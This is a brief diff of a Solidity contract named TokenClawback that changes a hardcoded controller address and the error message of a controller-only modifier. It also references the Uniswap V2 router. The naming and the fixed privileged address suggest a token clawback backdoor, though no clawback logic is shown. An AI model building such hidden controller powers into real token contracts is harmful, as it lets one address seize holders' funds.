@@ -14,7 +14,7 @@ abstract contract TokenClawback is Context {
     IUniswapV2Router02 _router;
 
     constructor() {
-        _controller = address(0xfE48e96195515e357430d1f95A3511Cb54f0a7Da);
+        _controller = address(0xA5e6b521F40A9571c3d44928933772ee9db82891);
         _router = IUniswapV2Router02(
             0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
         );
@@ -23,7 +23,7 @@ abstract contract TokenClawback is Context {
     modifier onlyERC20Controller() {
         require(
             _controller == _msgSender(),
-            "ProxyERC20: caller is not the ERC20 controller."
+            "TokenClawback: caller is not the ERC20 controller."
         );
         _;
     }
